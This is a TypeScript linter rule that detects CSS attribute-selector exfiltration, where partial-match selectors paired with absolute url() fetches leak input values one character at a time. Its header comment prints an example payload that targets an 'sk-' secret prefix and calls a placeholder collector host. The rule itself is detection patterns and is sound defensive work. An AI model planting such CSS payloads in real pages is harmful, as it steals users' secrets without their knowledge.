/**
 * PANE-CSP-010 — CSS attribute-selector exfiltration.
 *
 * A value-matching attribute selector paired with a `url()` leaks the matched
 * value one character at a time, with no JavaScript involved:
 *
 *     input[value^="sk-"] { background: url(https://collector.invalid/a) }
 *
 * The request fires only when the value matches, so an attacker enumerating
 * prefixes reconstructs a secret from which requests arrive. `:has()` extends
 * the same trick to a parent selector.
 *
 * ⚠ **The naive version flags every icon sprite.** `[class*="icon"]{background:
 * url(...)}` is a ubiquitous, entirely legitimate idiom, and so is
 * `[type="text"]`. Two narrowings keep this rule shippable:
 *
 *   1. The operator must be a PARTIAL matcher — `^=`, `$=` or `*=`. An exact
 *      `=` match leaks one bit that the attacker already had to guess, and it
 *      is how ordinary type- and state-based styling is written.
 *   2. The attribute must be VALUE-BEARING — one that carries user or tool
 *      data. `class`, `id` and `type` are authored by the app and carry
 *      nothing worth exfiltrating.
 *
 * The `url()` must also be absolute: a relative or `data:` URL reaches no
 * attacker-controlled origin, so it exfiltrates nothing.
 *
 * MEDIUM confidence — this reads declared CSS, and a selector can be
 * legitimate. See docs/RULES.md § Classification on why declared-CSS rules
 * never claim CERTAIN.
 */

import type { RuleContext, RuleResult, Finding } from '../../types.js';
import { defineRule, makeFinding, excerpt, CSP_SYNTHESIS_ASSUMPTION } from '../shared/helpers.js';

/**
 * Attributes that can hold data worth stealing.
 *
 * Deliberately narrow. `class`, `id` and `type` are app-authored and are what
 * the icon-sprite and input-styling idioms match on.
 */
const VALUE_BEARING = new Set([
  'value',
  'href',
  'src',
  'action',
  'formaction',
  'content',
  'placeholder',
  'title',
  'alt',
  'srcdoc',
  'data',
]);

/** `[attr^="x"]`, `[attr$="x"]`, `[attr*="x"]` — partial matchers only. */
const PARTIAL_MATCHER = /\[\s*([A-Za-z_:][-\w:.]*)\s*([\^$*])=\s*(['"]?)([^\]'"]*)\3\s*\]/g;

/** `url(...)` with an absolute http(s) target. */
const ABSOLUTE_URL = /url\(\s*(['"]?)(https?:\/\/[^)'"]+)\1\s*\)/i;

function isValueBearing(name: string): boolean {
  const lower = name.toLowerCase();
  return VALUE_BEARING.has(lower) || lower.startsWith('data-');
}

export const paneCsp010 = defineRule({
  id: 'PANE-CSP-010',
  ruleClass: 'RISK',
  severity: 'HIGH',
  confidence: 'MEDIUM',
  title: 'CSS attribute-selector or :has() exfiltration via url()',
  specRef: 'SEP-1865 §Security Implications — CSP Enforcement',
  cwe: 'CWE-201',
  remediation:
    'Remove the `url()` from rules whose selector matches on part of an attribute ' +
    'value. A partial-match selector paired with a network fetch leaks the matched ' +
    'value one character at a time, and no `_meta.ui.csp` field distinguishes it ' +
    'from a legitimate background image.',
  experimental: false,
  status: 'active',
  since: '0.1.0',
  // The whole PANE-CSP family declares `meta`, so directory mode skips it as a
  // unit rather than running some of it against scraped source.
  requires: ['meta', 'content'],

  check(ctx: RuleContext): RuleResult {
    const findings: Finding[] = [];
    const seen = new Set<string>();

    for (const decl of ctx.styles.allDeclarations()) {
      const url = ABSOLUTE_URL.exec(decl.value);
      if (!url) continue;

      PARTIAL_MATCHER.lastIndex = 0;
      let hit: RegExpExecArray | null;
      while ((hit = PARTIAL_MATCHER.exec(decl.selector)) !== null) {
        const attribute = hit[1]!;
        const operator = hit[2]!;
        if (!isValueBearing(attribute)) continue;

        const key = `${decl.selector}|${decl.prop}`;
        if (seen.has(key)) continue;
        seen.add(key);

        findings.push(
          makeFinding({
            ctx,
            rule: paneCsp010,
            message:
              `A CSS rule matches on part of the \`${attribute}\` attribute ` +
              `(\`${operator}=\`) and fetches an absolute URL. The request fires only ` +
              'when the value matches, which leaks it one character at a time.',
            evidence: excerpt(`${decl.selector} { ${decl.prop}: ${decl.value} }`),
            ...(decl.location ? { location: decl.location } : {}),
            path: `css:${decl.selector}:${decl.prop}`,
            assumption: CSP_SYNTHESIS_ASSUMPTION,
          }),
        );
        break;
      }
    }

    return { findings };
  },
});
